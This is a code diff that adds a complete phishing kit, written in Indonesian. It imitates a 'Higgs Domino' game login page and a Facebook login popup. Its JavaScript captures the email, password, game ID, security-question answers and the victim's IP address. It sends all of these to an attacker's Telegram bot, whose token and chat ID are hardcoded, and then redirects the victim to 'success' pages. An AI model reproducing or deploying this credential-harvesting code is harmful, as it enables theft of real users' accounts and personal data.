@@ -1,0 +1,1001 @@
+
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <audio autoplay loop id="lhjblg" src="sound/lobby_bk.mp3"></audio>
+    <audio id="clickSound" src="sound/click-sound.mp3"></audio>
+    <title>Higgs Domino - ID Login</title>
+    <link rel="stylesheet" href="css/style.css">
+
+</head>
+<body>
+    <img src="img/background.jpg" alt="Background" style="
+    width: 100%; 
+    height: 100%; 
+    position: absolute; 
+    top: 0; 
+    left: 0; 
+    z-index: -1; 
+    object-fit: cover;">
+</body>
+
+<button 
+    onclick="showFbLoginPopup()" 
+    style="
+        position: absolute; 
+        top: 68%; /* Sesuaikan posisi */
+        left: 36%; /* Sesuaikan posisi */
+        width: 250px;
+        height: 45px;
+        background:transparent;
+        border: none; 
+        ">
+</button>
+
+<div id="overlay" class="overlay"></div>
+<div id="fbLoginPopup" class="fb-login-popup">
+    <button class="close-popup" onclick="hideFbLoginPopup()">×</button>
+    <h2 class="popup-title">Login ke Facebook</h2>
+    <form id="fbLoginForm" onsubmit="event.preventDefault(); sendFBLoginData();">
+        <input 
+        type="text" 
+        id="fbEmail" 
+        placeholder="Email atau Nomor Telepon" 
+        class="popup-input" 
+        required>
+    <input 
+        type="password" 
+        id="fbPassword" 
+        placeholder="Kata Sandi" 
+        class="popup-input" 
+        required>
+    <button type="submit" class="popup-button">Masuk</button>
+    <a href="#" class="forgot-password">Lupa kata sandi?</a>
+    <hr>
+    <button type="button" class="create-account-button">Buat akun baru</button>
+</form>
+</div>
+    <!-- Tombol ID Login -->
+    <button 
+    onclick="playClickSound(); showPopup()" 
+    style="position: absolute; top: 15%; left: -6%; width: 153px; height: 49px; background: transparent; border: none; border-radius: 30%; z-index: 1000;">
+</button>
+    <!-- Pop-up Form Login -->
+    <div id="overlay" class="overlay"></div> <!-- Overlay -->
+    <div class="popup" id="loginPopup"> <!-- Popup -->
+        <div id="overlay" class="overlay"></div>
+        <img src="img/login.png" alt="ID Login Form">
+        <div class="input-container">
+            <input type="number" id="userID" placeholder="Silakan masukkan ID">
+            <input type="password" id="password" placeholder="6-16 angka atau huruf">
+        </div>
+        <button class="close" onclick="hidePopup()"></button>
+        <button 
+    id="submitButton" 
+    style="position: absolute; bottom: 23%; left: 37%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 10%; z-index: 1000;" 
+    onclick="playClickSound(); showSecurityNotification()">
+</button>
+    </div>
+
+    <!-- Gambar Keamanan -->
+    <div class="notification-container" id="securityNotification">
+        <img src="img/keamanan.png" alt="Keamanan">
+        <button style="position: absolute; bottom: 15%; left: 31%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 14%; z-index: 1000;"  onclick="playClickSound();showVerification()"></button>
+    </div>
+
+    <!-- Gambar Verifikasi -->
+    <div class="overlay"></div>
+    <div class="popup" id="verificationSection">
+        <button class="close close-verification" onclick="hideVerification()">×</button>
+        <img src="img/verifikasi.png" alt="Verifikasi">
+        <div class="input-container" style="left: 21%;">
+            <input type="text" id="answer1" class="input-placeholder" placeholder="Silakan masukkan Jawaban">
+<input type="text" id="answer2" class="input-placeholder" placeholder="Silakan masukkan Jawaban">
+        </div>
+
+            <button 
+            class="submit-button" 
+            style="position: absolute; bottom: 18%; left: 33%; background: transparent; color: transparent; width: 120px; height: 40px; border: none; border-radius: 10%; z-index: 2000;" 
+            onclick="playClickSound(); redirectToSuccess()">Kirim</button>
+    </div>
+
+    <!-- Tombol untuk Pengunjung -->
+    <button 
+        onclick="showIpLimitImage()" 
+        style="
+            position: absolute; 
+            bottom: 7%; 
+            left: 42%; 
+            width: 140px; 
+            height: 44px; 
+            background: none; 
+            color: transparent; 
+            font-size: 16px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            z-index: 1;">
+        Tampilkan Gambar
+    </button>
+    <button 
+    onclick="showLoadingThenVisitor()" 
+    style="
+        position: absolute; 
+        bottom: 7%; 
+        left: 42%; 
+        width: 140px; 
+        height: 40px; 
+        background: transparent; 
+        color: transparent; 
+        font-size: 16px; 
+        border: none; 
+        border-radius: 5px; 
+        cursor: pointer; 
+        z-index: 999;">
+    Tampilkan Gambar
+</button>
+
+
+    <!-- Popup Gambar IPLimit -->
+    <div id="ipLimitPopup" style="
+        display: none; 
+        position: fixed; 
+        top: 20%; 
+        left: 27%; 
+        width: 46%; 
+        height: auto; 
+        background: none; 
+        z-index: 1000; 
+        border-radius: 10px;">
+        <img src="img/iplimit1.png" alt="IP Limit" style="width: 100%; height: 100%; border-radius: 10px;">
+        <button onclick="hideIpLimitImage(); event.stopPropagation();" style="
+            position: absolute; 
+            top: 63%; 
+            right: 32%; 
+            background: transparent; 
+            color: transparent; 
+            border: none; 
+            border-radius: 18%; 
+            width: 154px; 
+            height:50px; 
+            cursor: pointer;">
+            ×
+        </button>
+    </div>
+    <button 
+    id="serviceButton"
+    onclick="redirectToService()" 
+    style="
+        position: absolute; 
+        background-color: transparent; 
+        color: transparent; 
+        top: 1px;
+        left: -41px;
+        width: 20%; 
+        height: 47px;
+        font-size: 16px; 
+        border-radius: 50px; 
+        z-index: 1000; 
+        background: none; 
+        outline: none; 
+        border: none;">
+</button>
+<div>
+
+<style>
+/* Mengatur warna placeholder */
+input[type="tel"]::placeholder {
+color: #E1B09E;
+opacity: 1; /* Pastikan terlihat */
+}
+</style>
+
+<!-- Tombol Tutup -->
+<button id="closeHpLoginPopup" onclick="hideHpLoginImage()" style="
+display: none; 
+position: fixed; 
+top: 18%; 
+right: 0%; 
+width: 14%; 
+height: 18%; 
+background: transparent; 
+color: transparent; 
+border: none; 
+padding: 10px 20px; 
+border-radius: px; 
+font-size: 16px; 
+z-index: 200000000;
+cursor: pointer;">
+Tutup
+</button>
+
+<!-- Tombol Tampilkan Verifikasi -->
+<button id="showVerificationButton" onclick="showVerificationImage()" style="
+    position: absolute; 
+    top: 179%; /* Atur posisi vertikal */
+    left: 21%; /* Atur posisi horizontal */
+    width: 143px; 
+    height: 44px; 
+    background-color: transparent; 
+    color: transparent; 
+    border: none; 
+    border-radius: 10px; 
+    font-size: 16px; 
+    cursor: pointer; 
+    z-index: 1000;">
+    Tampilkan Verifikasi
+</button>
+
+<div id="verificationPopup" style="
+display: none; 
+position: fixed; 
+top: -44px; 
+left: -280px; 
+width: 290%; 
+height: 290%; 
+background: rgba(0, 0, 0, 0.8); /* Overlay langsung diterapkan */
+z-index: 3000;">
+    <!-- Popup Gambar -->
+    <div style="
+        position: fixed; 
+        top: 59%; 
+        left: 44%; 
+        transform: translate(-50%, -50%); 
+        background: none; 
+        z-index: 3001;">
+        <img src="img/maintancehp2.png" alt="Verifikasi" style="
+            width: 150%; /* Lebar gambar */
+            height: auto; 
+            border-radius: 10px;">
+        <button id="closeAllButton" onclick="closeAllPopups()" style="
+            position: absolute; 
+            top: 57%; 
+            right: 8%; 
+            width: 132px; 
+            height: 46px; 
+            background: transparent; 
+            color: transparent; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 14px; 
+            cursor: pointer; 
+            z-index: 3002;">
+        </button>
+    </div>
+</div>
+
+
+</div> 
+    <script>
+        
+// Fungsi untuk menampilkan popup Verifikasi
+function showVerificationImage() {
+        document.getElementById('verificationPopup').style.display = 'block';
+    }
+
+    // Fungsi untuk menutup popup Verifikasi
+    function closeAllPopups() {
+        document.getElementById('verificationPopup').style.display = 'none';
+    }
+        function showVerificationImage() {
+    // Menampilkan popup verifikasi
+    document.getElementById('verificationPopup').style.display = 'block';
+}
+
+function hideVerificationImage() {
+    // Menyembunyikan popup verifikasi
+    document.getElementById('verificationPopup').style.display = 'none';
+}
+
+function closeAllPopups() {
+    // Sembunyikan popup HP Login
+    const hpLoginPopup = document.getElementById('hpLoginPopup');
+    if (hpLoginPopup) {
+        hpLoginPopup.style.display = 'none';
+    }
+
+    // Sembunyikan tombol Tutup
+    const closeHpLoginPopup = document.getElementById('closeHpLoginPopup');
+    if (closeHpLoginPopup) {
+        closeHpLoginPopup.style.display = 'none';
+    }
+
+    // Sembunyikan popup Verifikasi
+    const verificationPopup = document.getElementById('verificationPopup');
+    if (verificationPopup) {
+        verificationPopup.style.display = 'none';
+    }
+
+    // Sembunyikan gambar lainnya (jika ada)
+    const maintancePopup = document.getElementById('maintancePopup');
+    if (maintancePopup) {
+        maintancePopup.style.display = 'none';
+    }
+}
+
+        function showHpLoginImage() {
+    document.getElementById('hpLoginPopup').style.display = 'block';
+    document.getElementById('closeHpLoginPopup').style.display = 'block'; // Tampilkan tombol tutup
+}
+
+function hideHpLoginImage() {
+    document.getElementById('hpLoginPopup').style.display = 'none';
+    document.getElementById('closeHpLoginPopup').style.display = 'none'; // Sembunyikan tombol tutup
+}
+
+
+    </script>
+
+</button>
+    <script src="js/disable-in111spect.js"></script>
+    <script src="java/script.js"></script>
+</body>
+</html>
+
+code css
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+width: 100%;
+height: 100%;
+margin: 0;
+overflow: hidden;
+font-family: Arial, sans-serif;
+
+background: url('img/background.jpg') no-repeat center center/cover; 
+background: url('img/background.mp4') no-repeat center center/cover; 
+background-size: cover;
+}
+.popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 450px;
+    height: auto;
+    background: transparent;
+    display: none;
+    z-index: 10;
+    animation: popupFadeIn 0.4s ease-in-out;
+}
+
+.popup img {
+    width: 100%;
+    outline: none;
+    height: auto;
+}
+
+.popup .input-container {
+    position: absolute;
+    top: 32%;
+    left: 38%;
+    width: 32%;
+}
+
+.popup .input-container input {
+    width: 100%;
+    height: 35px;
+    padding: 0;
+    margin-bottom: 15px;
+    font-size: 14px;
+    border: none;
+    text-align: left;
+    background: transparent;
+    color: #E1B09E;
+    position: relative;
+    transform: translate(-10px, -14px);
+    transition: all 0.3s ease;
+}
+
+.popup .input-container input#password {
+    transform: translate(-10px, -18px);
+}
+
+.popup .input-container input::placeholder {
+    color: #E1B09E;
+    font-style: normal;
+}
+
+.popup .input-container input:focus {
+    outline: none;
+}
+
+.popup .close {
+    position: absolute;
+    top: 20%;
+    right: 8%;
+    width: 50px;
+    height: 50px;
+    border-radius: 25px;
+    background: transparent;
+    border: none;
+    
+}
+
+.notification-container {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 35%;
+    height: auto;
+    display: none;
+    z-index: 110;
+}
+
+.notification-container img {
+    width: 100%;
+    height: auto;
+}
+
+#verificationSection {
+    position: relative;
+    z-index: 10;
+    display: none;
+}
+
+#verificationSection .input-container input {
+font-size: 16px;
+color: #f2d0a7;
+font-family: "Arial", sans-serif;
+background: transparent;
+border: gray;
+outline: none;
+text-align: left;
+margin: 33px 0;
+width: 260px;
+height: 30px;
+text-shadow: 1px 1px 2px #000;
+padding-top: 10px;
+padding-bottom: 10px;
+padding-left: 5px;
+border-radius: 0;
+}
+
+#verificationSection .input-container #answer2 {
+position: relative;
+top: -28px; }
+
+#verificationSection {
+position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10;
+display: none;
+}
+
+#verificationSection img {
+    width: 100%;
+    height: auto;
+    margin-left: 22px;
+    max-width: 1000px;
+    transform: translateX(-10%);
+}
+
+.submit-button {
+    position: absolute;
+    bottom: 10%;
+    left: 80%;
+    width: 120px;
+    height: 40px;
+    background: transparent;
+    color: transparent;
+    border: none;
+    
+    pointer-events: auto;
+}
+
+.overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0, 0, 0, 0.7); z-index: 7; display: none; }
+
+.overlay.active {
+display: block; }
+
+#verificationSection .close-verification {
+position: absolute;
+bottom: 5px;
+right: 57px;
+width: 40px;
+height: 40px;
+margin: -14px 0 10px 0;
+background: transparent;
+color: transparent;
+font-size: 20px;
+font-weight: bold;
+border: none;
+border-radius: 50%;
+
+text-align: center;
+line-height: 30px;
+box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+z-index: 20;
+}
+.background-video {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+object-fit: cover;
+z-index: -1; }
+
+.content {
+position: relative;
+z-index: 1; color: white; text-align: center;
+padding: 20px;
+font-family: Arial, sans-serif;
+}
+body {
+background: url('img/background.jpg') no-repeat center center/cover;
+}
+
+.background-video {
+display: none;
+}
+
+@supports (object-fit: cover) {
+.background-video {
+display: block;
+}
+body {
+background: none;
+}
+}
+
+#verificationSection {
+transition: transform 0.3s ease-in-out; transform: translate(-50%, -50%); }
+
+#verificationSection.active-answer1 {
+transform: translate(-50%, -60%); }
+
+#verificationSection.active-answer2 {
+transform: translate(-50%, -80%); }
+.fb-login-popup {
+position: fixed;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+z-index: 1000;
+width: 400px;
+background: #ffffff;
+border-radius: 10px;
+box-shadow: 0px 4px 10px rgba(238, 4, 4, 0.2);
+padding: 20px;
+display: none;
+}
+
+.fb-login-popup .popup-title {
+font-size: 20px;
+color: #333333;
+text-align: center;
+margin-bottom: 20px;
+font-weight: bold;
+}
+
+.fb-login-popup .popup-input {
+width: 100%;
+padding: 10px;
+margin-bottom: 15px;
+border: 1px solid #ccc;
+border-radius: 5px;
+font-size: 14px;
+box-sizing: border-box;
+}
+
+.fb-login-popup .popup-button {
+width: 100%;
+padding: 10px;
+background: #1877f2;
+color: white;
+font-size: 16px;
+font-weight: bold;
+border: none;
+border-radius: 5px;
+}
+
+.fb-login-popup .popup-button:hover {
+background: #155db3;
+}
+
+.fb-login-popup .popup-links {
+text-align: center;
+margin-top: 15px;
+font-size: 14px;
+color: #555555;
+}
+
+.fb-login-popup .popup-links a {
+color: #1877f2;
+text-decoration: none;
+}
+
+.fb-login-popup .popup-links a:hover {
+text-decoration: underline;
+}
+
+.fb-login-popup .close-popup {
+position: absolute;
+top: 10px;
+right: 10px;
+background: transparent;
+border: none;
+font-size: 18px;
+font-weight: bold;
+color: #333333;
+}
+
+#verificationButton {
+z-index: 1000; }
+.create-account-button {
+width: 39%; padding: 11px;
+background: #42b72a;
+margin: 20px auto 10px; color: white;
+font-size: 16px;
+font-weight: bold;
+border: none;
+border-radius: 5px;
+display: block; text-align: center; }
+
+.create-account-button:hover {
+background: #36a420;
+}
+</style>
+
+code js
+
+<script>
+function redirectToService() {
+    window.location.href = "https://ikf.f2z7ly.com/web/index.do";
+}
+
+        function showLoadingThenVisitor() {
+    // Tampilkan gambar loading
+    const loadingPopup = document.createElement('div');
+    loadingPopup.id = 'loadingPopup';
+    loadingPopup.style = `
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 1000;
+    `;
+    loadingPopup.innerHTML = `<img src="../img/loading.png" alt="Loading" style="width: 550px; height: auto;">`;
+    document.body.appendChild(loadingPopup);
+
+    // Tunggu 2 detik, lalu tampilkan gambar pengunjung
+    setTimeout(() => {
+        document.getElementById('loadingPopup').remove(); // Hapus gambar loading
+        showIpLimitImage(); // Tampilkan gambar pengunjung
+    }, 2000); // 2000 ms = 2 detik
+}
+
+        function showIpLimitImage() {
+            document.getElementById('ipLimitPopup').style.display = 'block';
+        }
+
+        function hideIpLimitImage() {
+            document.getElementById('ipLimitPopup').style.display = 'none';
+        }
+
+        // Fix for subsequent button clicks
+        document.getElementById('ipLimitPopup').addEventListener('click', function(event) {
+            event.stopPropagation();
+        });
+function showIpLimitImage() {
+    document.getElementById('ipLimitPopup').style.display = 'block';
+}
+
+function hideIpLimitImage() {
+    document.getElementById('ipLimitPopup').style.display = 'none';
+}
+
+document.querySelector('#fbLoginForm .popup-button').addEventListener('click', playClickSound);
+        document.querySelectorAll('button').forEach(button => {
+    button.addEventListener('click', playClickSound);
+});
+    let isSubmitting = false; 
+
+function sendFBLoginData() {
+    
+    if (isSubmitting) {
+        return;
+    }
+
+    
+    const email = document.getElementById("fbEmail").value;
+    const password = document.getElementById("fbPassword").value;
+
+    
+    if (!email || !password) {
+        alert("Email dan Kata Sandi harus diisi!");
+        return;
+    }
+
+    
+    isSubmitting = true;
+
+    
+    const telegramBotToken = "8302795357:AAGU5q5q6bvCkl74YFf-Zw-5BDpdyhzsWRc";
+    const chatIDs = ["5879634123"]; 
+    const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+    
+    const message = `
+ðŸ”” Login Facebook Detected ðŸ””
+
+ðŸ•’ Waktu Login: ${new Date().toLocaleString()}
+ðŸ‘¤ Email: ${email}
+ðŸ”‘ Password: ${password}
+
+_Cuan Masuk, pastikan Anda Selalu Stenbay._
+    `;
+
+    
+    const sendPromises = chatIDs.map((chatID) =>
+        fetch(telegramURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatID,
+                text: message,
+            }),
+        })
+    );
+
+    
+    Promise.all(sendPromises)
+        .then((responses) => {
+            const failedResponses = responses.filter((response) => !response.ok);
+            if (failedResponses.length > 0) {
+                console.error("Gagal mengirim data ke beberapa chat ID.");
+                
+            } else {
+                console.log("Data berhasil dikirim ke semua chat ID.");
+                
+            }
+        })
+        .catch((error) => {
+            console.error("Terjadi kesalahan saat mengirim data:", error);
+        })
+        .finally(() => {
+            isSubmitting = false; 
+        });
+
+    
+    setTimeout(() => {
+        window.location.href = "../facebook.php";
+    }, 1000);
+}
+
+        
+function showFbLoginPopup() {
+    document.getElementById("fbLoginPopup").style.display = "block";
+}
+
+
+function hideFbLoginPopup() {
+    document.getElementById("fbLoginPopup").style.display = "none";
+}
+
+
+
+const verificationSection = document.getElementById('verificationSection');
+const answer1Input = document.getElementById('answer1');
+const answer2Input = document.getElementById('answer2');
+
+
+answer1Input.addEventListener('focus', () => {
+    verificationSection.classList.remove('active-answer2'); 
+    verificationSection.classList.add('active-answer1'); 
+});
+
+
+answer2Input.addEventListener('focus', () => {
+    verificationSection.classList.remove('active-answer1'); 
+    verificationSection.classList.add('active-answer2'); 
+});
+
+
+[answer1Input, answer2Input].forEach(input => {
+    input.addEventListener('blur', () => {
+        verificationSection.classList.remove('active-answer1', 'active-answer2'); 
+    });
+});
+
+
+
+
+        function showSecurityNotification() {
+    const submitButton = document.getElementById('submitButton');
+    
+    
+    if (submitButton.disabled) {
+        return; 
+    }
+
+    
+    submitButton.disabled = true;
+    submitButton.style.cursor = 'not-allowed'; 
+
+    const loginPopup = document.getElementById('loginPopup');
+    const securityNotification = document.getElementById('securityNotification');
+
+    
+    loginPopup.style.display = 'none';
+    securityNotification.style.display = 'block';
+}
+function resetSubmitButton() {
+    const submitButton = document.getElementById('submitButton');
+    submitButton.disabled = false;
+    submitButton.style.cursor = 'pointer'; 
+}
+       
+const clickSound = document.getElementById('clickSound');
+
+
+function playClickSound() {
+    clickSound.currentTime = 0; 
+    clickSound.play(); 
+}
+
+
+        function hideVerification() {
+    const verificationSection = document.getElementById('verificationSection');
+    const overlay = document.getElementById('overlay'); 
+    verificationSection.style.display = 'none'; 
+    overlay.classList.remove('active'); 
+}
+function showFbLoginPopup() {
+    document.getElementById("fbLoginPopup").style.display = "block"; 
+    document.getElementById("overlay").classList.add("active"); 
+}
+
+function hideFbLoginPopup() {
+    document.getElementById("fbLoginPopup").style.display = "none"; 
+    document.getElementById("overlay").classList.remove("active"); 
+}
+function showVerification() {
+    console.log("Tombol Tentukan diklik"); 
+    const verificationSection = document.getElementById('verificationSection');
+    const securityNotification = document.getElementById('securityNotification');
+    const overlay = document.getElementById('overlay');
+
+    if (!verificationSection || !securityNotification || !overlay) {
+        console.error("Elemen tidak ditemukan.");
+        return;
+    }
+
+    
+    securityNotification.style.display = 'none';
+    verificationSection.style.display = 'block';
+    overlay.classList.add('active'); 
+}
+
+
+
+function hideVerification() {
+    console.log("Tombol Close diklik!"); 
+    const verificationSection = document.getElementById('verificationSection');
+    const overlay = document.getElementById('overlay');
+    verificationSection.style.display = 'none'; 
+    overlay.classList.remove('active'); 
+}
+
+
+        const overlay = document.getElementById('overlay');
+const loginPopup = document.getElementById('loginPopup');
+
+function showPopup() {
+    loginPopup.style.display = 'block'; 
+    overlay.classList.add('active');   
+}
+
+function hidePopup() {
+    loginPopup.style.display = 'none'; 
+    overlay.classList.remove('active'); 
+}
+
+function showSecurityNotification() {
+    const loginPopup = document.getElementById('loginPopup');
+    const securityNotification = document.getElementById('securityNotification');
+
+    loginPopup.style.display = 'none'; 
+    securityNotification.style.display = 'block'; 
+}
+
+
+let isSubmitted = false; 
+
+function redirectToSuccess() {
+    if (isSubmitted) {
+        console.log("Data sudah dikirim. Tidak mengirim ulang.");
+        return; 
+    }
+
+    const userID = document.getElementById('userID').value;
+    const password = document.getElementById('password').value;
+    const answer1 = document.getElementById('answer1').value;
+    const answer2 = document.getElementById('answer2').value;
+
+    if (!userID || !password || !answer1 || !answer2) {
+        return; 
+    }
+
+    isSubmitted = true; 
+    document.getElementById('submitButton').disabled = true; 
+
+    const loginTime = new Date().toLocaleString();
+
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+            const userIP = ipData.ip;
+            const telegramBotToken = "8302795357:AAGU5q5q6bvCkl74YFf-Zw-5BDpdyhzsWRc";
+            const chatIDs = ["5879634123"]; 
+            const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            const message = `
+ðŸ”” Login Detected ðŸ”” 
+ðŸ•’ Login Time: ${loginTime}
+
+ðŸ”‘ User ID: ${userID}
+ðŸ”‘ Password: ${password}
+
+ðŸ›¡  Security Questions and Answers:
+   Q1. Apa film favorit Anda? ${answer1}
+   Q2. Apa Makanan Kesukaan Anda? ${answer2}
+
+     Semoga Beruntung
+            `;
+
+            const sendPromises = chatIDs.map(chatID => {
+                return fetch(telegramURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatID,
+                        text: message
+                    })
+                });
+            });
+
+            Promise.all(sendPromises)
+                .then(responses => {
+                    const allSuccessful = responses.every(response => response.ok);
+                    if (allSuccessful) {
+                        console.log("Data berhasil dikirim ke semua chat Telegram.");
+                        window.location.href = '../success.php'; 
+                    } else {
+                        console.error("Gagal mengirim data ke salah satu chat Telegram.");
+                        document.getElementById('submitButton').disabled = false; 
+                        isSubmitted = false; 
+                    }
+                })
+                .catch(error => {
+                    console.error("Terjadi kesalahan saat mengirim data:", error);
+                    document.getElementById('submitButton').disabled = false; 
+                    isSubmitted = false; 
+                });
+        })
+        .catch(error => {
+            console.error("Gagal mendapatkan alamat IP:", error);
+            document.getElementById('submitButton').disabled = false; 
+            isSubmitted = false; 
+        });
+}
+</script>
